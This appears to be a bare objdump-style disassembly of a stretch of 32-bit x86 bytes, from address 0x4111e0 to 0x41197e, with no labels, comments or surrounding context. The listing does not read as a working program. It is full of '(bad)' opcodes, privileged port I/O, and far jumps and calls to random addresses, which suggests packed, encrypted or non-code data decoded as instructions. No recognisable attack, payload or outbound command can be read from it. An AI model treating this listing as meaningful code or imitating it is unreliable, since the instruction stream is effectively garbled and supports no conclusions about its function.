  4111e0:	data16 jo 0x411236
  4111e3:	hlt    
  4111e4:	arpl   WORD PTR [edi+edi*1],di
  4111e7:	test   eax,0x9e6ceae2
  4111ec:	lahf   
  4111ed:	mov    BYTE PTR [ebx-0x62],bh
  4111f0:	into   
  4111f1:	aas    
  4111f2:	pop    ds
  4111f3:	lock iret 
  4111f5:	out    dx,eax
  4111f6:	scas   eax,DWORD PTR es:[edi]
  4111f7:	test   al,0xd6
  4111f9:	and    esp,ecx
  4111fb:	and    BYTE PTR [eax],bh
  4111fd:	ror    DWORD PTR [ecx-0x7ac1497f],cl
  411203:	jno    0x41127c
  411205:	loope  0x4111b1
  411207:	mov    WORD PTR [edi],ds
  411209:	fs rcl ebp,0x2
  41120d:	adc    DWORD PTR [ecx],edx
  41120f:	scas   al,BYTE PTR es:[edi]
  411210:	push   0x15
  411212:	mov    ds:0xf419f1af,eax
  411217:	dec    esi
  411218:	xchg   ebx,eax
  411219:	arpl   WORD PTR [ebx],cx
  41121b:	cld    
  41121c:	jle    0x41121a
  41121e:	xchg   ecx,eax
  41121f:	mov    esi,0xee018fb4
  411224:	outs   dx,BYTE PTR ds:[esi]
  411225:	inc    ebp
  411226:	pop    ebx
  411227:	xchg   esi,eax
  411228:	pushf  
  411229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122a:	jb     0x41129b
  41122c:	adc    eax,0x9542c7eb
  411231:	loopne 0x4111e5
  411233:	ret    
  411234:	inc    esi
  411235:	and    ah,BYTE PTR [eax]
  411237:	sahf   
  411238:	rol    DWORD PTR cs:[esi-0x1b04a888],0x41
  411240:	mov    al,BYTE PTR [esi+0x22]
  411243:	lds    esp,FWORD PTR [ebx-0x6e]
  411246:	and    al,0xe5
  411248:	sub    BYTE PTR [eax],0xb6
  41124b:	in     eax,0x4f
  41124d:	stos   DWORD PTR es:[edi],eax
  41124e:	jle    0x41126b
  411250:	leave  
  411251:	mov    al,ds:0x840d9d2b
  411256:	int    0x50
  411258:	sub    eax,0xb7c67ab3
  41125d:	sub    al,0xb8
  41125f:	and    al,ch
  411261:	jg     0x41122f
  411263:	dec    eax
  411264:	inc    eax
  411265:	lock xor esp,DWORD PTR [eax]
  411268:	push   es
  411269:	jmp    0x108fab74
  41126e:	call   0xde4b:0x4d4fd4e5
  411275:	fisub  DWORD PTR [eax+0x5fdfb6eb]
  41127b:	mov    ebx,DWORD PTR [ebp+0x40]
  41127e:	inc    ecx
  41127f:	xchg   ebx,eax
  411280:	pop    ebp
  411281:	ret    0x2f16
  411284:	add    al,BYTE PTR [ebx+edi*8]
  411287:	cmp    al,0x68
  411289:	inc    esi
  41128a:	mov    cl,0xd9
  41128c:	mov    BYTE PTR [ecx+0x31911b0c],ch
  411292:	or     eax,0x75650d2
  411297:	inc    edi
  411298:	sbb    cl,0xbf
  41129b:	jg     0x41127f
  41129d:	push   esp
  41129e:	pop    ecx
  41129f:	imul   ecx,DWORD PTR [edi+ebp*2+0x303daddd],0xfc0a1b1a
  4112aa:	ret    0xefa5
  4112ad:	out    dx,al
  4112ae:	in     al,dx
  4112af:	cli    
  4112b0:	(bad)
  4112b3:	fwait
  4112b4:	cld    
  4112b5:	retf   0xa68
  4112b8:	mov    ebp,0x2b41441d
  4112bd:	(bad)  
  4112be:	das    
  4112bf:	jp     0x41125d
  4112c1:	push   esi
  4112c2:	psrlq  mm2,mm0
  4112c5:	mov    cl,0xd
  4112c7:	adc    eax,DWORD PTR [ebp+edi*8-0x724c1d7]
  4112ce:	scas   eax,DWORD PTR es:[edi]
  4112cf:	xor    BYTE PTR [eax+0x68],ch
  4112d2:	leave  
  4112d3:	iret   
  4112d4:	fild   QWORD PTR [ecx-0x2908f6ef]
  4112da:	iret   
  4112db:	sbb    eax,0x6f37d08d
  4112e0:	test   DWORD PTR [ecx-0x80],ecx
  4112e3:	out    0xbd,eax
  4112e5:	add    esi,DWORD PTR [ebx+0x631f733f]
  4112eb:	gs (bad) 
  4112ed:	std    
  4112ee:	dec    ebx
  4112ef:	sar    DWORD PTR [ecx*8+0x5b65c78c],cl
  4112f6:	dec    eax
  4112f7:	jle    0x4112cf
  4112f9:	popa   
  4112fa:	arpl   WORD PTR [edx-0x11],cx
  4112fd:	mov    edi,DWORD PTR [ecx]
  4112ff:	add    DWORD PTR [edx],esp
  411301:	pop    ebx
  411302:	mov    eax,0x11e44b79
  411307:	mov    eax,cs:0x1509493d
  41130d:	imul   ebp,DWORD PTR [ebx+0xf],0x1e
  411311:	mov    ds:0x43014346,eax
  411316:	lods   eax,DWORD PTR ds:[esi]
  411317:	outs   dx,BYTE PTR ds:[esi]
  411318:	shl    DWORD PTR [edi],0xe4
  41131b:	pop    ebp
  41131c:	int3   
  41131d:	adc    al,0x27
  41131f:	dec    edx
  411320:	repnz cmp BYTE PTR [esi+eax*2+0x3e],ah
  411325:	je     0x411336
  411327:	fsub   st(2),st
  411329:	in     eax,dx
  41132a:	fnsave [edi]
  41132c:	bound  edx,QWORD PTR [esi-0x523bd8e8]
  411332:	mov    edi,0x1ded7af4
  411337:	mov    DWORD PTR [ebp+0x4700d762],ebx
  41133d:	les    ebx,FWORD PTR [eax-0x6a58383b]
  411343:	mov    cs,WORD PTR [edx-0x42f941c5]
  411349:	and    eax,0x9d5cb762
  41134e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134f:	jmp    0x738771fd
  411354:	frstor [edi+0x16]
  411357:	pop    edx
  411358:	push   ecx
  411359:	fdiv   QWORD PTR [edx+0x31b60a4d]
  41135f:	sbb    bl,BYTE PTR [ebx-0x5]
  411362:	dec    ebp
  411363:	xchg   esp,eax
  411364:	cmp    al,0xdc
  411366:	loop   0x4113c8
  411368:	xlat   BYTE PTR ds:[ebx]
  411369:	dec    ebx
  41136a:	mov    al,ds:0x35335c05
  41136f:	xlat   BYTE PTR ds:[ebx]
  411370:	gs dec eax
  411372:	and    dl,bh
  411374:	cdq    
  411375:	mov    dl,0x5e
  411377:	cmp    al,0x69
  411379:	lds    ebp,FWORD PTR [eax]
  41137b:	and    esp,DWORD PTR [edx+0x1045eef3]
  411381:	sub    eax,0x197cb599
  411386:	pop    eax
  411387:	nop    DWORD PTR [ebp-0x72]
  41138b:	mov    cl,dh
  41138d:	cmp    eax,ebx
  41138f:	pop    ds
  411390:	and    edi,DWORD PTR [eax+0x5b67b1a2]
  411396:	loop   0x411326
  411398:	dec    edi
  411399:	adc    DWORD PTR [ecx+0x1a],0xffffffe3
  41139d:	push   edi
  41139e:	mov    ebp,0xb189ffff
  4113a3:	xlat   BYTE PTR ds:[ebx]
  4113a4:	jp     0x4113a0
  4113a6:	cmp    DWORD PTR ds:0xc1bbb5ae,esi
  4113ac:	sub    DWORD PTR [esi+eiz*8+0x42],edx
  4113b0:	adc    ebx,0x49
  4113b3:	fwait
  4113b4:	out    dx,eax
  4113b5:	outs   dx,DWORD PTR ds:[esi]
  4113b6:	jns    0x41134d
  4113b8:	sub    DWORD PTR [edi],ebp
  4113ba:	inc    ebx
  4113bb:	popf   
  4113bc:	xor    BYTE PTR [ecx],ah
  4113be:	mov    cl,0xd6
  4113c0:	out    dx,eax
  4113c1:	fcom   DWORD PTR [ebp+0x8]
  4113c4:	ins    BYTE PTR es:[edi],dx
  4113c5:	sti    
  4113c6:	lods   eax,DWORD PTR ds:[esi]
  4113c7:	ins    BYTE PTR es:[edi],dx
  4113c8:	(bad)  
  4113c9:	push   edx
  4113ca:	and    BYTE PTR [ebx-0x39],0xda
  4113ce:	xchg   BYTE PTR [esi-0x54],al
  4113d1:	int3   
  4113d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d3:	ret    
  4113d4:	xchg   edx,eax
  4113d5:	loop   0x411445
  4113d7:	jge    0x411419
  4113d9:	cmp    BYTE PTR [eax+eax*8+0x26d66a6f],0xd5
  4113e1:	lock pop ebx
  4113e3:	dec    esp
  4113e4:	cmp    eax,0x442a3099
  4113e9:	nop
  4113ea:	adc    eax,DWORD PTR [ebx+0x45]
  4113ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ee:	adc    DWORD PTR [eax+0x18],ecx
  4113f1:	aad    0x52
  4113f3:	push   ds
  4113f4:	push   0xffffffc6
  4113f6:	jl     0x4113be
  4113f8:	jne    0x411395
  4113fa:	mov    ss,WORD PTR [ebx+edi*4+0x44]
  4113fe:	adc    ebp,DWORD PTR [edi-0x3f613d99]
  411404:	addr16 and eax,0x88985a92
  41140a:	aas    
  41140b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41140c:	adc    al,0x85
  41140e:	icebp  
  41140f:	sbb    esi,edx
  411411:	jge    0x4113ff
  411413:	jg     0x4113c2
  411415:	test   eax,0xd59b6b15
  41141a:	push   esp
  41141b:	loopne 0x411424
  41141d:	sahf   
  41141e:	push   ebx
  41141f:	data16 mov cl,0x86
  411422:	and    ebx,DWORD PTR [edi-0x4613c4a7]
  411428:	test   edi,ebx
  41142a:	mov    al,0x6a
  41142c:	xchg   ebx,eax
  41142d:	repz push ds
  41142f:	out    dx,al
  411430:	add    BYTE PTR [ecx+0x421df5ef],bh
  411436:	inc    esi
  411437:	dec    esp
  411438:	push   ecx
  411439:	push   ss
  41143a:	sbb    DWORD PTR [edi],edx
  41143c:	aaa    
  41143d:	out    0x96,al
  41143f:	mov    dh,BYTE PTR [esi]
  411441:	(bad)  
  411442:	jp     0x411435
  411444:	mov    al,ds:0xe8088a6c
  411449:	or     ch,BYTE PTR [esi+0x11]
  41144c:	mov    ecx,0xcdb9feb5
  411451:	cmp    BYTE PTR [edx+esi*2],dh
  411454:	outs   dx,DWORD PTR ds:[esi]
  411456:	and    DWORD PTR [ecx],ecx
  411458:	das    
  411459:	jb     0x411469
  41145b:	adc    DWORD PTR [esi-0x5d],0xffffffd3
  41145f:	mov    gs,WORD PTR ds:0x3560fe85
  411465:	imul   eax,DWORD PTR [edi+edi*1+0x6cd153e6],0x3f
  41146d:	out    0xa2,eax
  41146f:	pop    es
  411470:	xlat   BYTE PTR ds:[ebx]
  411471:	mov    ds:0xa92fb814,eax
  411476:	mov    ds:0x4cca5d7b,al
  41147b:	xor    esi,DWORD PTR [ebx]
  41147d:	ret    
  41147e:	sub    bl,BYTE PTR [ebp+0x14]
  411481:	mov    ebp,0x76ffb151
  411486:	addr16 mov eax,0xc8700cd2
  41148c:	jge    0x4114c9
  41148e:	pop    DWORD PTR [eax-0x57be773b]
  411494:	test   eax,0xfd8c00e
  411499:	ficomp DWORD PTR [esi-0x6d]
  41149c:	int    0xc8
  41149e:	mov    ah,0xf7
  4114a0:	mov    eax,0xda126ad4
  4114a5:	sbb    edx,DWORD PTR [ecx]
  4114a7:	dec    esi
  4114a8:	pushf  
  4114a9:	scas   al,BYTE PTR es:[edi]
  4114aa:	shl    DWORD PTR [edi+eiz*4+0x1c],cl
  4114ae:	pop    ecx
  4114af:	dec    DWORD PTR [esi-0x6]
  4114b2:	enter  0xe67d,0x6a
  4114b6:	lods   eax,DWORD PTR ds:[esi]
  4114b7:	out    dx,al
  4114b8:	fcomp  QWORD PTR [edx+0x1883a7d0]
  4114be:	enter  0x5dd1,0x17
  4114c2:	sbb    ah,BYTE PTR [ecx]
  4114c4:	js     0x411449
  4114c6:	enter  0x1674,0xb7
  4114ca:	jle    0x4114db
  4114cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114cd:	leave  
  4114ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114cf:	xor    eax,0x52cdceae
  4114d4:	or     eax,0x7562f3ea
  4114d9:	add    DWORD PTR [edx],ecx
  4114db:	js     0x411518
  4114dd:	jmp    0x4114a2
  4114df:	rcl    BYTE PTR [edi-0x20],cl
  4114e2:	mov    edx,0x2f731a01
  4114e7:	or     ecx,DWORD PTR [edi]
  4114e9:	push   ebp
  4114ea:	push   0xffffff8d
  4114ec:	mov    eax,ds:0x87368c91
  4114f1:	xchg   DWORD PTR [esi+eiz*1],eax
  4114f4:	stc    
  4114f5:	cmp    eax,0xaabe42f9
  4114fa:	inc    eax
  4114fb:	sub    ebp,DWORD PTR [eax]
  4114fd:	int    0x7a
  4114ff:	(bad)  
  411500:	jl     0x411521
  411502:	or     BYTE PTR [edi-0x6a18068a],bl
  411508:	and    ch,BYTE PTR [ecx]
  41150a:	sti    
  41150b:	ins    BYTE PTR es:[edi],dx
  41150c:	sub    DWORD PTR [esi-0x3a],0xffffffee
  411510:	loope  0x411505
  411512:	bound  ebx,QWORD PTR ds:0x818e0d1f
  411518:	jnp    0x4114bf
  41151a:	cmc    
  41151b:	adc    cl,BYTE PTR ds:0x1ba9e15d
  411521:	fadd   st,st(4)
  411523:	imul   ebp,ecx,0xffffffd2
  411526:	clc    
  411527:	sub    al,0x3b
  411529:	inc    esp
  41152a:	inc    ebp
  41152b:	push   edi
  41152c:	sbb    al,0xba
  41152e:	ror    DWORD PTR [esp+esi*4+0x2fa0d61b],cl
  411535:	add    cl,BYTE PTR [eax-0xb]
  411538:	mov    BYTE PTR [esi+esi*1-0x76],dh
  41153c:	pushw  cs
  41153e:	scas   eax,DWORD PTR es:[edi]
  41153f:	(bad)  
  411540:	or     al,bh
  411542:	pop    ebp
  411543:	in     al,0xd5
  411545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411546:	fsub   st,st(4)
  411548:	in     eax,0x86
  41154a:	dec    ecx
  41154b:	and    eax,0x93ffb305
  411550:	sahf   
  411551:	shr    eax,cl
  411553:	mov    edx,0xcdedf530
  411558:	pop    ecx
  411559:	das    
  41155a:	cmp    BYTE PTR [ebx+0x66],0xd5
  41155e:	rol    DWORD PTR [edi],1
  411560:	jne    0x4115bc
  411562:	out    dx,eax
  411563:	aaa    
  411564:	xchg   BYTE PTR [edx],ch
  411566:	push   edx
  411567:	ja     0x4115d9
  411569:	mov    esp,0xdbd8eb3f
  41156e:	xor    esi,ecx
  411570:	fnsave [edx]
  411572:	or     BYTE PTR [edx],ah
  411574:	imul   esi,DWORD PTR [ebp+edi*2+0x4b],0xe49a7e0e
  41157c:	sbb    ecx,DWORD PTR [ecx]
  41157e:	ins    BYTE PTR es:[edi],dx
  41157f:	pop    ss
  411580:	fcomp  QWORD PTR [edx+0x7fb31d2e]
  411586:	cmp    DWORD PTR [edx],esi
  411588:	in     al,0xa5
  41158a:	sti    
  41158b:	rol    DWORD PTR [bp+si+0x14],1
  41158f:	idiv   eax
  411591:	xchg   esp,eax
  411592:	repz test al,0x5f
  411595:	xchg   ebp,eax
  411596:	pop    edx
  411597:	mov    DWORD PTR [eax-0x63f40523],eax
  41159d:	xchg   esi,eax
  41159e:	cmp    al,0xf9
  4115a0:	ficomp WORD PTR [ebp+0x468f34d6]
  4115a6:	stos   BYTE PTR es:[edi],al
  4115a7:	add    DWORD PTR [edx-0x768aa775],edx
  4115ad:	das    
  4115ae:	xor    DWORD PTR [ecx-0x1360c4be],ebp
  4115b4:	pop    esp
  4115b5:	inc    edi
  4115b6:	lods   al,BYTE PTR ds:[esi]
  4115b7:	pop    ds
  4115b8:	or     edi,0x4bb3eefd
  4115be:	xchg   edi,eax
  4115bf:	mov    ebx,0x2c9e59e4
  4115c4:	sahf   
  4115c5:	cdq    
  4115c6:	ret    0x1979
  4115c9:	cld    
  4115ca:	xor    edx,DWORD PTR [edi+0x4af8e622]
  4115d0:	pop    es
  4115d1:	and    eax,0xb810cbe8
  4115d6:	sbb    DWORD PTR [edx+0x7ca4a416],edi
  4115dc:	xchg   edx,eax
  4115dd:	sbb    ebp,ebp
  4115df:	or     dh,ah
  4115e1:	inc    esi
  4115e2:	into   
  4115e3:	dec    edi
  4115e4:	xor    eax,0x4d950575
  4115e9:	std    
  4115ea:	push   edi
  4115eb:	cmp    eax,0x1ded7661
  4115f0:	lods   eax,DWORD PTR ds:[esi]
  4115f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115f2:	sbb    al,0x62
  4115f4:	and    BYTE PTR cs:[edx-0x71e0df43],0xe
  4115fc:	sub    al,0x44
  4115fe:	lock jecxz 0x41166f
  411601:	shl    DWORD PTR [edi],cl
  411603:	cmc    
  411604:	push   ebp
  411605:	ds (bad) 
  411607:	repnz das 
  411609:	push   cs
  41160a:	pushf  
  41160b:	add    edi,esi
  41160d:	loop   0x411590
  41160f:	pop    ebx
  411610:	xchg   ebp,eax
  411611:	pop    es
  411612:	xchg   esi,eax
  411613:	(bad)  
  411614:	or     eax,0x7e0f4f17
  411619:	push   es
  41161a:	mov    eax,ds:0x5822ead2
  41161f:	and    DWORD PTR ds:0x46c7c3f2,edi
  411625:	test   al,0xea
  411627:	dec    ebp
  411628:	rcl    DWORD PTR [edi],cl
  41162a:	or     ebp,DWORD PTR [ecx-0x13]
  41162d:	xor    BYTE PTR [edi],bh
  41162f:	xlat   BYTE PTR ds:[ebx]
  411630:	jge    0x4115c9
  411632:	gs add cl,cl
  411635:	scas   al,BYTE PTR es:[edi]
  411636:	test   al,0xd7
  411638:	rol    DWORD PTR [eax-0x70],0x0
  41163c:	jle    0x4116a6
  41163e:	fisttp DWORD PTR [edx+ebp*1]
  411641:	inc    ebx
  411642:	out    0x28,al
  411644:	(bad)  
  411645:	jb     0x4115d7
  411647:	leave  
  411648:	clc    
  411649:	(bad)  
  41164a:	and    edi,DWORD PTR [eax-0x2897f2a1]
  411650:	and    eax,0x55bb74aa
  411655:	sub    ah,BYTE PTR [edi+0x7b]
  411658:	push   ss
  411659:	mov    bh,0x9c
  41165b:	xor    ch,BYTE PTR [ebp-0x78]
  41165e:	xchg   ecx,eax
  41165f:	mov    edx,edx
  411661:	dec    eax
  411662:	aam    0x32
  411664:	and    BYTE PTR [ecx+0x67cdaad6],bh
  41166a:	adc    BYTE PTR [esi+0x71740dd7],ch
  411670:	in     eax,dx
  411671:	sbb    ah,BYTE PTR [esi+0x684d2f2b]
  411677:	jns    0x4116c0
  411679:	outs   dx,BYTE PTR ds:[esi]
  41167a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41167b:	fisubr DWORD PTR [esi+0x41]
  41167e:	imul   eax,DWORD PTR [ebx-0x23937a38],0xffffff83
  411685:	je     0x411611
  411687:	mov    ebp,ebx
  411689:	inc    esp
  41168a:	adc    BYTE PTR ds:0xe4218a4,dh
  411690:	in     eax,dx
  411691:	mov    DWORD PTR ds:0xbd54736f,ebx
  411697:	push   ecx
  411698:	rol    DWORD PTR [ebp+0x7f],cl
  41169b:	data16 rcl BYTE PTR [esp+edi*8-0x41da0be2],0xe8
  4116a4:	data16 and al,bh
  4116a7:	xor    bh,BYTE PTR [esi+0x47d81f12]
  4116ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ae:	cmp    DWORD PTR [eax+eax*4-0x5f183eaa],0xffffff86
  4116b6:	bound  ecx,QWORD PTR [ecx+0x7a093fc6]
  4116bc:	ds out 0xaf,al
  4116bf:	lahf   
  4116c0:	add    edi,DWORD PTR [ebx+0x4ff6205d]
  4116c6:	dec    eax
  4116c7:	mov    dh,0xe3
  4116c9:	mov    ecx,0x8c4fa645
  4116ce:	inc    eax
  4116cf:	(bad)  
  4116d0:	scas   al,BYTE PTR es:[edi]
  4116d1:	push   ecx
  4116d2:	fwait
  4116d3:	and    ch,dh
  4116d5:	add    bl,BYTE PTR [ecx]
  4116d7:	not    DWORD PTR [ecx]
  4116d9:	sub    DWORD PTR [ebx],0xffffffca
  4116dc:	add    DWORD PTR ds:0xd7ab74cb,eax
  4116e2:	mov    bl,0xd4
  4116e4:	daa    
  4116e5:	cmp    DWORD PTR [ebx+0x20dd54f0],edi
  4116eb:	(bad)  
  4116ec:	fcom   DWORD PTR [edi-0x6d]
  4116ef:	push   eax
  4116f0:	loope  0x4116e9
  4116f2:	ins    DWORD PTR es:[edi],dx
  4116f3:	push   ds
  4116f4:	dec    BYTE PTR [esi+eax*1-0x50]
  4116f8:	ficom  WORD PTR [esi+0x41]
  4116fb:	popa   
  4116fc:	add    eax,0x435488c5
  411701:	fsubr  QWORD PTR [edx-0x2c0f7059]
  411707:	shl    BYTE PTR [eax],cl
  411709:	pusha  
  41170a:	mov    si,?
  41170d:	fsubr  DWORD PTR [edx]
  41170f:	push   cs
  411710:	xchg   esp,eax
  411711:	fs jno 0x411714
  411714:	out    0xc2,al
  411716:	jge    0x4116f7
  411718:	outs   dx,DWORD PTR ds:[esi]
  411719:	sbb    BYTE PTR [eax+0x23],ah
  41171c:	jo     0x411741
  41171e:	lock mov ecx,0x408ddaec
  411724:	dec    eax
  411725:	mov    cl,0x7f
  411727:	pop    eax
  411728:	xor    DWORD PTR [ebx-0x47],ecx
  41172b:	in     al,0x83
  41172d:	pop    eax
  41172e:	iret   
  41172f:	xor    BYTE PTR [eax],ah
  411731:	xchg   ecx,eax
  411732:	gs addr16 and eax,0x53618cf7
  411739:	push   edx
  41173a:	jns    0x411751
  41173c:	test   al,0x4b
  41173e:	mov    BYTE PTR [ecx+edx*4-0x8],dl
  411742:	shl    DWORD PTR [ebx-0x2fb0a1d4],cl
  411748:	add    edx,DWORD PTR [ebp-0x14]
  41174b:	jmp    0x879a18ac
  411750:	adc    eax,0xccf26475
  411755:	(bad)  
  411756:	aam    0x2d
  411758:	xchg   edi,eax
  411759:	repnz inc esp
  41175b:	push   0xffffff9d
  41175d:	push   edi
  41175e:	sub    al,0x3b
  411760:	dec    ebp
  411761:	pop    eax
  411762:	ret    
  411763:	adc    dh,BYTE PTR [esi+eiz*1]
  411766:	je     0x41171b
  411768:	lods   al,BYTE PTR ds:[esi]
  411769:	popa   
  41176a:	xchg   esp,eax
  41176b:	cmp    eax,0x805f11d5
  411770:	test   eax,0xbab7453b
  411775:	rcr    BYTE PTR [eax-0x59],1
  411778:	inc    DWORD PTR [edx+0x2]
  41177b:	mov    ah,0x99
  41177d:	clc    
  41177e:	stos   BYTE PTR es:[edi],al
  41177f:	ret    0xa8ec
  411782:	mov    ecx,0x55eb7897
  411787:	shl    BYTE PTR [edi],1
  411789:	test   dh,al
  41178b:	push   edx
  41178c:	pop    edx
  41178d:	mov    bl,0x58
  41178f:	call   0xaadef843
  411794:	imul   esp,DWORD PTR [ebp+0x17],0xd9f675a9
  41179b:	popf   
  41179c:	jb     0x4117f4
  41179e:	mov    edx,0x23087451
  4117a3:	push   eax
  4117a4:	and    dh,BYTE PTR [edi-0x49]
  4117a7:	sub    BYTE PTR [ecx+0x8],0x43
  4117ab:	sub    DWORD PTR [eax],edi
  4117ad:	sbb    al,0x69
  4117af:	fidiv  DWORD PTR [ebp+0xe]
  4117b2:	rcr    BYTE PTR [esi-0xc],cl
  4117b5:	stos   DWORD PTR es:[edi],eax
  4117b6:	sub    al,ah
  4117b8:	neg    BYTE PTR [ebx]
  4117ba:	addr16 or ecx,esi
  4117bd:	jmp    0x53f5:0x94452690
  4117c4:	mov    edi,0x942a5e42
  4117c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ca:	cld    
  4117cb:	shl    BYTE PTR [ecx+0x1e5a47f5],0x72
  4117d2:	xchg   bh,ch
  4117d4:	in     eax,0x89
  4117d6:	gs pop es
  4117d8:	outs   dx,BYTE PTR ds:[esi]
  4117d9:	push   eax
  4117da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117db:	adc    al,0xd0
  4117dd:	bound  esp,QWORD PTR [esi-0x23612240]
  4117e3:	loopne 0x4117b4
  4117e5:	ret    0x16d2
  4117e8:	push   ebx
  4117e9:	pop    esp
  4117ea:	jne    0x41178c
  4117ec:	add    bl,BYTE PTR [ecx-0x5bd32e97]
  4117f2:	stos   DWORD PTR es:[edi],eax
  4117f3:	jbe    0x411793
  4117f5:	retf   
  4117f6:	mov    edi,0xcd5b200f
  4117fb:	mov    dl,0xaa
  4117fd:	cli    
  4117fe:	sbb    DWORD PTR [eax],0x36159d70
  411804:	sbb    DWORD PTR [eax+esi*2],ebp
  411807:	cmp    al,0x4
  411809:	std    
  41180a:	leave  
  41180b:	stos   BYTE PTR es:[edi],al
  41180c:	data16 rcl BYTE PTR [ebx-0xd3ee02b],0x7b
  411814:	les    ebp,FWORD PTR [eax+0x7a878871]
  41181a:	enter  0x4e67,0x60
  41181e:	loope  0x411837
  411820:	(bad)  
  411821:	xchg   ebx,eax
  411822:	or     edx,ebx
  411824:	sbb    ah,BYTE PTR [esi+ebp*8-0x60]
  411828:	iretw  
  41182a:	mov    ds:0x98ce4883,al
  41182f:	add    BYTE PTR [edx],bh
  411831:	jmp    0x8aa2:0xd61bf076
  411838:	ja     0x4118a4
  41183a:	jmp    0xa110a7f1
  41183f:	scas   al,BYTE PTR es:[edi]
  411840:	pop    ss
  411841:	mov    edi,?
  411843:	arpl   si,cx
  411845:	cs icebp 
  411847:	adc    ah,BYTE PTR [ecx]
  411849:	popf   
  41184a:	xchg   edx,eax
  41184b:	push   es
  41184c:	lock imul esi,DWORD PTR [edi+0x70],0x34
  411851:	aam    0xce
  411853:	test   DWORD PTR [eax-0x37],edx
  411856:	mov    esp,0xb2b6e738
  41185b:	push   0x28
  41185d:	sub    al,0xc8
  41185f:	cli    
  411860:	in     eax,dx
  411861:	adc    DWORD PTR [esi+eax*2+0x45be2790],eax
  411868:	in     al,dx
  411869:	cmp    esi,DWORD PTR [esi+0x10]
  41186c:	call   0xbc18cc60
  411871:	arpl   bx,sp
  411873:	jae    0x4118d8
  411875:	sbb    al,0x99
  411877:	xor    al,0xfd
  411879:	push   es
  41187a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41187c:	pop    ds
  41187d:	push   cs
  41187e:	popf   
  41187f:	inc    esi
  411880:	sub    al,0xaa
  411882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411883:	pop    ecx
  411884:	lds    ebx,FWORD PTR [eax]
  411886:	xor    DWORD PTR [ecx],0x963c48b8
  41188c:	(bad)  
  41188d:	cli    
  41188e:	daa    
  41188f:	mov    bl,0xe6
  411891:	jp     0x411897
  411893:	fdivp  st(2),st
  411895:	push   sp
  411897:	mov    dl,BYTE PTR [eax+0x55]
  41189a:	sti    
  41189b:	sbb    al,0x68
  41189d:	les    esp,FWORD PTR [ebx]
  41189f:	repz imul ebp,esp,0xffffffa5
  4118a3:	and    dl,bl
  4118a5:	repnz adc esp,DWORD PTR [edi-0x15ae7443]
  4118ac:	(bad)  
  4118ad:	cmp    eax,0x5e3bc746
  4118b2:	das    
  4118b3:	jg     0x41189b
  4118b5:	ror    BYTE PTR [ebp+0x4],1
  4118b8:	adc    bl,bl
  4118ba:	adc    al,BYTE PTR [ebx+0x5b4be6d0]
  4118c0:	push   esi
  4118c1:	dec    ebp
  4118c2:	xchg   DWORD PTR [edi-0x76cfcfe5],esi
  4118c8:	js     0x411946
  4118ca:	mov    ebx,0xee5a25df
  4118cf:	add    cl,cl
  4118d1:	iret   
  4118d2:	lea    ecx,[ecx]
  4118d4:	popa   
  4118d5:	out    dx,eax
  4118d6:	inc    eax
  4118d7:	arpl   WORD PTR [ecx+0x73],cx
  4118da:	cdq    
  4118db:	mov    al,ds:0x1b9a6c3c
  4118e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e1:	stos   BYTE PTR es:[edi],al
  4118e2:	and    eax,DWORD PTR [ecx]
  4118e4:	cmp    eax,0x587ed52
  4118e9:	ss cmp esp,ebx
  4118ec:	pop    esi
  4118ed:	dec    esi
  4118ee:	mov    dh,0xd7
  4118f0:	add    DWORD PTR [edx+0x2b783424],edx
  4118f6:	sti    
  4118f7:	pop    es
  4118f8:	inc    ebp
  4118f9:	sbb    esi,DWORD PTR [esi]
  4118fb:	pop    eax
  4118fc:	fisttp QWORD PTR [edi+0x23]
  4118ff:	cmp    esp,esp
  411901:	leave  
  411902:	xchg   ebp,eax
  411903:	ror    BYTE PTR [ebx],cl
  411905:	or     DWORD PTR [edx+ebp*4],edx
  411908:	inc    edi
  411909:	(bad)  
  41190a:	mov    ebp,0x8f01cd39
  41190f:	xor    bh,bl
  411911:	test   DWORD PTR [ebp-0xd],ecx
  411914:	cmp    eax,0xe33fbb1c
  411919:	jae    0x411982
  41191b:	mov    al,ds:0xd062a7f0
  411920:	inc    edx
  411921:	stos   BYTE PTR es:[edi],al
  411922:	mov    bl,0xe2
  411924:	xor    dh,BYTE PTR ds:0x965f9f15
  41192a:	adc    DWORD PTR [edi+eiz*8-0x135b5fb],ecx
  411931:	or     ebx,DWORD PTR [edx-0x76796201]
  411937:	adc    ecx,DWORD PTR [edx+0x13]
  41193a:	shl    bl,cl
  41193c:	ins    DWORD PTR es:[edi],dx
  41193d:	cwde   
  41193e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41193f:	stos   DWORD PTR es:[edi],eax
  411940:	sbb    dl,BYTE PTR [ecx]
  411942:	(bad)  
  411943:	mov    WORD PTR [edi],fs
  411945:	jp     0x41195a
  411947:	xor    ebp,DWORD PTR ds:[eax+0x21c87d6d]
  41194e:	enter  0xd975,0xcb
  411952:	and    al,0x2b
  411954:	pop    es
  411955:	push   esp
  411956:	std    
  411957:	push   esi
  411958:	jnp    0x4119bb
  41195a:	mov    DWORD PTR [ebp-0x37bc0ece],eax
  411960:	sub    al,0xb8
  411962:	outs   dx,BYTE PTR ds:[esi]
  411963:	lods   eax,DWORD PTR ds:[esi]
  411964:	(bad)  
  411965:	jmp    0x1869c639
  41196a:	lock jne 0x4119d4
  41196d:	mov    ds:0x419a59da,al
  411972:	cmp    al,0xf6
  411974:	jmp    0x411983
  411976:	out    0x3c,al
  411978:	adc    DWORD PTR [esi-0x3],esi
  41197b:	xchg   edi,eax
  41197c:	fisubr DWORD PTR [ecx]
  41197e:	(bad)  
